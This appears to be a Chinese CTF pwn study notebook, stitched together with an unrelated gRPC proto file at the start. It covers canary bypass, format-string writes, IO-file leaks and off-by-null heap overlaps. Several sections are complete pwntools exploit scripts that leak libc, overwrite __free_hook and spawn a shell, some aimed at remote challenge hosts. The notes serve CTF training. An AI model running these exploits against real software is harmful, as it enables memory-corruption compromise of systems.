// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

syntax = "proto3";

//导入路径
option go_package = "google.golang.org/grpc/examples/helloworld/helloworld";
option java_multiple_files = true;
option java_package = "io.grpc.examples.helloworld";
option java_outer_classname = "HelloWorldProto";

package helloworld;

// The greeting service definition.
service Greeter {
  // Sends a greeting
  rpc SayHello (HelloRequest) returns (HelloReply) {}
}

// The request message containing the user's name.
message HelloRequest {
  string name = 1;
}

// The response message containing the greetings
message HelloReply {
  string message = 1;
}

```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240316123038.png)





```shell
// protoc --python_out=./ ./ctf.proto
// ctf.proto        to      ctf_pb2.py

# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: ctf.proto
"""Generated protocol buffer code."""
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\tctf.proto\x12\x03\x63tf\")\n\x03pwn\x12\x10\n\x08username\x18\x01 \x01(\x0c\x12\x10\n\x08password\x18\x02 \x01(\x0c')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'ctf_pb2', _globals)
if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _globals['_PWN']._serialized_start=18
  _globals['_PWN']._serialized_end=59
# @@protoc_insertion_point(module_scope)




```




### canary绕过🐦
#### leak canary

通过格式化字符串，或者溢出去泄露(这种情况需要过程中没有check代码，到了下一个check点恢复即可)


#### 爆破canary

在多进程时，每个子进程的canary都是相同的。因此可以采用one-by-one的方式来对canary进行爆破

#### 劫持TLS绕过canary

每个线程都会有一个TLS，溢出足够大的字节覆盖到TLS结构体，校验canary时会通过fs结构体中的值和当前的canary进行比对，若不同则报错。

##### 子进程

子进程中该结构体和栈都使用mmap映射到了同一个段中，且其地址比子进程的栈高。因此，可以直接通过栈溢出来覆盖掉tls结构体。即在子进程中若栈存在长度极大的溢出，可以覆盖TLS来覆盖canary。溢出字节需要够大，通常至少一个page（4K）1024B

##### 主进程

主进程中tls结构体仍然位于映射段，但我们知道映射段实际上是基于libc地址的一个偏移。因此，要修改tls结构体基本上不能通过简单的栈溢出，而是可以考虑有libc地址的情况下打一个任意地址写，或者是malloc一个很大的内存，使其通过mmap分配到映射段前面，然后通过堆块溢出来修改tls结构体的值

归根到底，子进程的tls结构体同样也在映射段上，只是因为子进程的栈也是映射出来的，因此可以直接栈溢出来修改。


#### 劫持 stack_chk_fail的got表



###  printf/scanf族函数的格式化字符串漏洞

%s 会把第二个参数作为指针变量，引索指针值

关于减去字节数
%是一个字节，p是一个字节，数字部分按10进制算，一个数字是一个字节，h是一个字节，n是一个字节
但是减去前边的字节数不包括当前的这个%号！即
%2p   减2

####  非栈上一次改ebp链

%n修改除了指定偏移的方式，还可以用默认偏移修改，多余的部分可以用%p进行填充(填充的长度为%p输出的内容总长)

一次printf格式化字符串把所有的$的n写入准备好再一次统一写入，所以不用 $就可以一次写2回
除了能写2回，还可以泄露出一定的地址，如果写2回构造循环即可改出one_gadget

fmt工具看下第一次改的地址偏移，如果是11 就给11-2个p

```python
pay = "%p"*0x9+ '%'+str((ret & 0xffff)-0x65)+'c%hn'  # %p占9个位置剩下2个位置一个%占一个，恰好到11也就是我要改的偏移，0x65为%p输出内容的总长

pay += '%' + str((0x23+0xd8)) + 'c%37$hhn' # 记得减去前边的长度，这里长度建议动调确认

s(pay)

# print(hex(len('0x5624b86d10400x1000x7f67d9d161510xb(nil)0x7ffcdaca6cf00x93e041eb8ec261000x5624b86ce2600x7f67d9c27bf7')))
# 0x65
```

#### 栈上

```python
# fmtstr_payload
payload ="%2c%310$hhn;%310$p".ljust(0x18)# 修改栈上的某个值为2/泄露libc
payload += fmtstr_payload(9,{ret_addr:start}, numbwritten=0x17)# 修改返回地址为start


# 第一个参数：fmtstr开始的地方的偏移(题目输入偏移是6，fmtstr_payload开始的地方偏移是9)
# 第二个参数：ret_addr : aaa -> bbb  将aaa改为start
# 第三个参数：numbwritten: fmtstr_payload用%c构成读入字节数，这里fmtstr_payload前边有内容所以要剪掉字节长,0x17 = 0x18-1

```



#### 堆上

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1","10000")
p = process("./shell")
elf = ELF("./shell")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# 泄露libc和栈地址
sa("> ",'echo '+'%6$p-%10$p')
sa("> ",'cat')
ru('0x')
libc_base = int(p.recv(12),16)-libc.sym['_IO_file_jumps']
lg('libc_base')
one = libc_base + 0xe3b01 
lg('one')
ru('0x')
stack_addr= int(p.recv(12),16)
lg('stack_addr')
ret = stack_addr+0x8
lg('ret')

# aaa(%17$p) : bbb(%45$p) -> ccc 
# aaa(%17$p) : bbb(%45$p) -> ret -> libc_function
# 改aaa的偏移即改ccc

sa("> ",'echo '+'%' + str(ret & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one & 0xffff) + 'c%45$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str((ret+2) & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one>>16 & 0xff) + 'c%45$hhn')
sa("> ",'cat')

sa("> ",'exit\n')

ia()
```

#### bss上

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote('node4.buuoj.cn', 29966) 
# p = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

buf = 0x804A060+0x4
shellcode = asm(shellcraft.i386.linux.sh())

sl("%6$p")
ru("0x")
stack = int(p.recv(8),16)
lg('stack')
ret = stack-0xc

pay = '%' + str(ret & 0xff) + 'c%6$hhn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = '%' + str(buf & 0xffff) + 'c%10$hn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = 'quit' + shellcode
s(pay)

ia()
```







### scanf 跳过读入漏洞

```c
def getint():
	size_t tmp;
    scanf("%lld", &tmp);
    return tmp;

choice = getint();

switch(choice){
     ...
     default:
        printf("Invalid choice: %d.\n", choice);
}
```

输入- 或 + 等字符让scanf不读入任何数据，则tmp是一个未初始化的值，那么可以经过printf打印出来，从而泄露栈上的数据。有的时候可以通过该方式泄露libc等重要的值

### srand(time(0))随机数绕过

```python
from ctypes import *
libc1 = cdll.LoadLibrary('./libc-2.31.so')
libc1.srand(0) # libc1.()括号里的内容可以为time(0)等
j = str((libc1.rand()+1)%3)
```

### close(0/1/2)关闭输入输出流

如果使用close(1)关闭了输出流，可以使用exec 1>&0将其重定向到stdin，因为这三个都是指向终端的，可以复用。

或者

直接修改掉_IO_2_1_stdout_的_fileno字段为2(错误流)或者0(输入流)，也可以再次打开stdout。

如果题目是
格式化字符串
close(1)

主要的2种解决办法：
+ 将_IO_2_1_stdout_的fileno字段改为2
+ 将stdout的指针（一般位于bss）指向stderr


### 格式化字符串：改printf返回地址到_start

若改printf返回地址到_start，我们便会在栈上留下一个_IO_2_1_stdout_的指针
再次运行到这里时，我们就可以首先修改该指针末尾使其指向其fileno，将其改为2。即可绕过。

### 格式化字符串：利用magic_gadget改bss上的stdout指针

bss上的stdout和stderr一般后三位不同，因此也难以直接修改。

但是我们可以利用magic_addr来修改bss上的stdout指针为_IO_2_1_stderr_。

有关magic_gadget可以看本文的magic gadget部分内容。

此外需要注意的是，修改后只能用printf而不是puts来泄露内容，因为puts是不走bss上的IO的。

### read函数返回0或-1

不关闭输入通道

```python
# read 返回值为 0 
from pwn import *
import tty
p = process("./eof_1",stdin=PTY,raw=False)
p.send(chr(tty.CEOF))
p.clean()

```

关闭输入通道

可以用p.shutdown_raw('send')来发送EOF，效果是让read函数返回0。

### realloc_hook 调整栈帧

```python
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
realloc_hook = libc_base + libc.sym['__realloc_hook']
one = libc_base + 0x4527a

# 劫持malloc为'a'*0xb+p64(one)+p64(realloc+xxx)
edit(1,0x10,p64(malloc_hook-0x23))
add(0x68,'a')# 3
add(0x68,'a'*0xb+p64(one)+p64(realloc+xxx))# 手动调整
```


### 计算器题目

通常用栈作为计算的位置，即存放计算的过程信息，+-符号等

输出结果的地方用数组引索数组越界 == 泄露libc



## 堆风水艺术🎨

glibc堆管理系统缺陷，案例分析

### 常见漏洞点和思路
+ 

+ 全局变量作if比较
全局变量被赋值后进行if判断，判断失败不会进入处理，导致全局变量已经改变但是未处理，用于size溢出

+ printf格式化字符串做泄露
%s   指针或者数组(能去引索)
%d 不够地址长度的数(不能引索)

+ scanf来读入内容
scanf读入内容至堆块 == 堆溢出

+ edit和show的是同一个堆块
可用来伪造chunk

+ show能输出堆块内容
输出unsortbin尚存的libc地址 （常规）

+ add功能malloc申请堆块size无限制
能申请到一个libc地址

+ 涉及到开启fd句柄
往往通过覆盖实现开启0号fd

+ 任意libc地址写值(无要求)
IO_list_all/global_max_fast

+ 数组下标不能为int和char类型！
会导致越界

+ 输入后缺少size校验
正向越界，edit越界导致可以修改下一个size

+ 嵌套索引表结构

机制比较完善的情况下，考虑能否劫持结构体链表的表头，一旦劫持表头就有了完全控制权
特别是存放表头地址的变量放在栈上
然后是，伪造结构体表项，因为这种功能针对的都是结构体表项，只要能伪造就能利用功能实现任意地址写



连引plt结构
show外层“姓名”，“姓名”连接到堆块地址->直接执行地址->调用printf_got表覆写

+ 在调用 pool_alloc 函数时使用 32 位数值 + 1 拓展成 64 位的方法
存在整数溢出

+ 出现特意的不同size的堆块
想到切割，想到堆叠

### Fuzz找漏洞

w: 清空后覆写，没有先创建
a: 追加，没有先创建
r: 不清空覆写，没有会报错
所有后边多一个+，都是同时读写

```python
def fuzz():
    f=open('./log.txt','w')
    for i in range(0x1000):
        if(i%10==0):
            a = randint(0,8)
            b = randint(0,8)
            add(a,b,str(i))
            data0=r.recvuntil('Choice Table')
            if 'two many' in data0:
                break
            f.write(' add({},{},str({}))\n'.format(a,b,i))
        elif(i%2==0):
            a = randint(0,8)
            b = randint(0,8)
            delet(a,b)
            data0=r.recvline()
            if 'not exists' in data0:
                continue
            f.write(' delet({},{})\n'.format(a,b))
        else:
            continue
            a = randint(0,8)
            b = randint(0,8)
            c = randint(0,8)
            d = randint(0,8)
            query(a,b,c,d)
            data0=r.recvuntil('Choice Table')
            if 'totally 0 elements' in data0:
                continue
            elif '\x55' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
            elif '\x56' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
    f.close()
```


```python
def fuzz():
    f=open('log.txt','w')
    for i in range(0,0x1000):
        if i % 10 == 0:
           idx=randint(0,0x10)
           add(idx,0x20)
           f.write('add({},0x20)'.format(idx)+'\n')
        elif i % 2 == 0 :
           idx=randint(0,0x10)
           delet(idx)
           f.write('delt({})'.format(idx)+'\n')
        elif i % 3 == 0 :
           idx=randint(0,0x10)
           show(idx)
           r.recvuntil('>>: ')
           check_char=r.recv(1)
           if check_char == '\x55' or check_char == '\x56':
              f.write('show({})'.format(idx)+'\n')
              break            
    f.close()
```


### musl

```bash
sudo cp ./libc.so /lib/ld-musl-x86_64.so.1
sudo cp ./libc.so /usr/local/musl/lib/libc.so

ld-musl-x86_64.so.1 -> /usr/local/musl/lib/libc.so
```


### 无 show 的堆题

+ 通过stdout泄露输出libc地址

若程序赋予了我们修改stdout的能力，且程序会调用相关IO的函数（如put，printf），则可以通过该方式来输出libc的地址（缓冲区刷新会将缓冲区中的数据写入到实际的输出设备）
若程序没有调用IO函数，无法通过该方式来输出（__malloc_assert中含有fxprintf）

![](https://xzfile.aliyuncs.com/media/upload/picture/20240727215814-449f2fd0-4c20-1.png)


那么可以考虑通过利用unsortedbin中残留的libc指针
通过覆盖低地址的方式来申请到stdout的地址，从而修改IO结构体结合IO函数刷新泄露地址

```c
p64(0xfbad1887)+p64(0)*3+p8(0x58)

p64(0xfbad1800)+p64(0)*3+'\x00'

flat([0x00000000fbad3887,0,0,0,environ_libc,environ_libc+8,environ_libc+8,environ_libc+8])
```

IO结构体如下

```shell
pwndbg> p stdin
$1 = (FILE *) 0x7f250d9b98e0 <_IO_2_1_stdin_>
pwndbg> fp 0x7f250d9b98e0
$2 = {
  file = {
    _flags = -72540021,
    _IO_read_ptr = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_read_end = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_read_base = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_base = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_ptr = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_end = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_buf_base = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_buf_end = 0x7f250d9b9964 <_IO_2_1_stdin_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "\n",
    _lock = 0x7f250d9bb720 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7f250d9b99c0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f250d9b8030 <_IO_file_jumps>
}
pwndbg> dq 0x7f250d9b98e0
00007f250d9b98e0     00000000fbad208b 00007f250d9b9963
00007f250d9b98f0     00007f250d9b9963 00007f250d9b9963
00007f250d9b9900     00007f250d9b9963 00007f250d9b9963
00007f250d9b9910     00007f250d9b9963 00007f250d9b9963
```

+ 通过stderr输出敏感信息(flag)

我们可以使得程序触发__malloc_assert()，从而触发_IO_2_1_stderr_来输出报错信息。由于触发了__malloc_assert往往会使得程序退出，因此只有flag等敏感信息已经被读取到内存空间后，再直接通过报错输出

stderr的输出和stdout类似，需要将_flags改为0xfbad1887，然后输出_IO_write_base和_IO_write_ptr之间的内容

这是因为__malloc_assert中的__fxprintf函数是IO函数，且其第一个参数传参为NULL的时候会转换为stderr，达到泄露的目的。

+ 放弃泄露libc地址

直接通过修改unsortedbin的fd指针(0x7f)和got表(0x7f)信息等方式来获得其他libc函数的执行能力。
或者是没有libc版本的情况，即便能泄露read的真实地址，也没办法算出libc的偏移，仍然依赖程序的got表，使用已有的函数实现rop，想getshell就只能依靠syscall，syscall=read+0xe，再利用csureadexec一波流

### 无 edit 的堆题

无edit，又需要修改fd指针完成劫持，可以构造一个堆复用(dup)，例如在fastbinchunk和unsortbinchunk是一个头节点，那我改unsortbin的fd那fasbin就和一起变，这里换个size切割，就不会影响的fasbinchunk了

### 捷径-scanf泄露libc

利用malloc_合并实现讲fastbin中的所有堆块合并放入largebin或者smallbin，从而粘取libc地址

```c
__isoc99_scanf("%u", &v3);

p.sendlineafter('Your choice: ','99999999'*0xf0)
```

### 链式索引表堆题

即多级索引表
这里主要指的是以链表形式管理的堆块结构，涉及到双链表，单链表的脱链和插入等

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231127155812.png)
但实际情况会更复杂，因为会有的申请多个附属堆块，一般来说都是可以show附属堆块的内容，所以核心技巧就是劫持0x50堆块

### offbynull与堆块合并

```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == '\n' )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;                                      // offbynull
  return 0LL;
}
```

注意：
**高版本(2.31以上)要堆地址的，有就简单，没有就需要能申请小size的堆块做堆叠**
**没有edit的情况，参考下边的记录**



原理：

利用堆的合并机制，当检测到存在prevsize位，当前堆块prechunk_size_inuse位为0（这里注意size的处理，0xf8（0x100）的堆块，会被标记为0x101，而offbynul会使其为0x100，这样是不改变size大小的，不然会导致size大小的改变），且prevsize位\==上个堆块的size位，free的时候就顺便合并上一个堆块。高版本，多一个check(对上一个堆块的)

**简而言之，合并的关键在于头尾free的状态，修改prevsize相当于换头**





![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)
check即针对换头的，可以直接设置上一个堆块的fd和bk都为它自己(head)来绕过

可以用来构造堆叠

```
a  
	设置prevsize，顺便offbynull
b	free这个堆块

c
```

再申请出来就有libc了(mainarena+96，这个地址通常低位为\0)

后续反复申请回来利用这个堆叠结构劫持tcache实现任意地址申请

#### 低版本

2.27功能齐全

```python
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("old_school_revenge")
elf = ELF('old_school_revenge')
libc = elf.libc

def cmd(choice):
	sla('Your choice: ',choice)
def add(idx,size):
	cmd(1)
	sla('Index: ',idx)
	sla('Size: ',size)

def edit(idx,content):
	cmd(2)
	sla('Index: ',idx)
	p.sendlineafter(': ',content)

def show(idx):
	cmd(3)
	sla('Index: ',idx)

def delete(idx):
	cmd(4)
	sla('Index: ',idx)
def dbg():
	gdb.attach(p)
	pause()

for i in range(9):
	add(i,0x48)
for i in range(8):
	delete(i)

p.sendlineafter('Your choice: ','99999999'*0xf0)
for i in range(7):
	add(i,0x48)

add(7,0x48)
show(7)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6)+'\x00'*2)-160-0x3EBC40
lg('libc_base',libc_base)
free=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
# 前面是看到scanf输入直接抄板子梭哈了，获取到libc
for i in range(10,17):
	add(i,0xf8)
add(17,0xf8)
add(18,0x88)# edit中间这个chunk
add(19,0xf8)
add(20,0x88)
for i in range(10,17):
	delete(i)

delete(17)
edit(18,'a'*0x80+p64(0x190))
delete(19)
for i in range(10,17):
	add(i,0xf8)
add(21,0xf8)
add(22,0x88)
delete(18)
edit(22,p64(free))
add(23,0x88)
edit(23,'/bin/sh\x00')
add(24,0x88)
edit(24,p64(sys))
delete(23)
p.interactive()
```


2.27 无edit

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("139.196.183.57","32022") #typ="udp"
# p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size,con="a"):
    sla("Your choice:",1)
    sla("Index:",idx)
    sla("Size:",size)
    sa("Content:",con)

def show(idx):
    sla("Your choice:",2)
    sla("Index:",idx)


def dele(idx):
    sla("Your choice:",3)
    sla("Index:",idx)


for i in range(0,7):add(i,0xf8)

add(7,0xf8)
add(8,0x78)
add(9,0xf8)
add(10,0x78)

for i in range(0,7):dele(i)


dele(7)
dele(8)
add(8,0x78,'\x00'*0x70+p64(0x180))
dele(9)


for i in range(0,7):
	add(i,0xf8)

add(11,0xf8)

show(8)
libc_base = l64()-0x3ebca0
lg("libc_base")
free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']

add(12,0x78)
add(13,0xf8)

for i in range(0,7):dele(i)
for i in range(0,7):add(i,0x78)
add(14,0x78)
for i in range(0,7):dele(i)

dele(8)
dele(14)
dele(12)
for i in range(0,7):add(i,0x78)

add(8,0x78,p64(free_hook))
add(12,0x78)
add(14,0x78,"/bin/sh\x00")
add(15,0x78,p64(system))

dele(14)
ia()
```


#### 高版本(2.29以上)

如果没有地址需要依靠offbynull泄露地址，就稍微麻烦一点

需要几个条件：

* 能申请0x20，最后堆叠切割需要一个最小size的堆

```python
from pwn import *
context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("bornote")
elf = ELF('bornote')
libc = elf.libc

def cmd(choice):
	sla("aaa's cmd: ",choice)

def add(size):
	cmd(1)
	sla('Size: ',size)

def edit(idx,content):
	cmd(3)
	sla('Index: ',idx)
	p.sendlineafter('Note: ',content)

def show(idx):
	cmd(4)
	sla('Index: ',idx)

def delete(idx):
	cmd(2)
	sla('Index: ',idx)

def dbg():
	gdb.attach(p)
	pause()
fakechunk = 0x00005561306c6f00
sla('username: ','aaa')


# 这里size最大最好别超过0x440，不然放进largebin时/不在同一个区间上
add(0x418) # 0 
add(0x128) # 1 # 最后绕过tcache个数检测，和最后利用堆复用的chunk一样大
add(0x418) # 2
add(0x438) # 3 
add(0x148) # 4
add(0x428) # 5 
add(0x138) # 6

# fakechunk 粘fd和bk
delete(0)
delete(3)
delete(5)

#设置fakechunk size位
delete(2) 
add(0x438)  # 0 
edit(0,'a' * 0x418 + p64(0xb01)[:7])
add(0x418)  # 2 
add(0x428)  # 3 
add(0x418)  # 5 

# 设置bk
delete(5)
delete(2)
add(0x418)  # 2 
edit(2,p64(0))
add(0x418)  # 5 

# 设置fd
delete(5)
delete(3)
add(0x5f8)# 3 # 置入largebin
add(0x428)# 5
edit(5,'')
add(0x418)# 7
add(0xf8)# 8

# 设置prevsize
edit(6,'a'*0x130+p64(0xb00))
delete(3)

add(0x10)# 3
show(7)
p.recvuntil("Note: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))- 0x1EBBE0
lg('libc_base',libc_base)
sys = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]
#----------------------------------------------------------------
add(0x128)#9
delete(1)
delete(9)
edit(7,p64(free_hook))
add(0x128)# 1
add(0x128)# 9
edit(1,"/bin/sh\x00")
edit(9,p64(sys))
delete(1)

p.interactive()

#---------无edit-------------------------------------------------

read_channel(0x138,'1')# 9
dele(9)
dele(6)
read_channel(0x8f0,'1'*(0x860*8)+bin(free_hook)[2:][::-1])#6
read_channel(0x138,bin(0x68732f6e69622f)[2:][::-1])#9
read_channel(0x138,bin(system)[2:][::-1])#10
dele(9)

```




#### 堆块合并

unlink主要是用于在释放内存时，从双向链表中移除相应的块。

```c
//原本是宏定义函数，进行修改
/* Take a chunk off a bin list */
int unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

builtin_expect 是一个编译器内置函数，用于提示分支预测，提高代码执行效率。在这里，它用于处理异常情况的错误检查。

堆块合并又叫堆叠，是使用堆溢出或者offbyone等漏洞实现的技术。UAF是一个笼统的概念，既可以指free后没有在索引表bss_chunk_manage处置空堆块，又可以指use afterfree addr，使用free后的堆块残留的地址。前者看free，后者看add或edit。

* 堆叠实际上就是人工构造了UAF(第一种)
* UAFA是glibc的机制，也叫做粘连地址，是通常获取地址的手段，原理是堆块free后放入bin中会被glibc写入一些地址（如果add或者edit会导致输入结尾有\\x00，那UAFA就用不了）。malloc_consolide、间隔free大堆块这些都属于UAFA

UAF的后续利用一个是改fd，一个是double_free

### double free
00的形式，fastbin不支持，tcache
010的形式，fastbin是支持的，tcache一直都不支持
主要是检测当前释放堆块

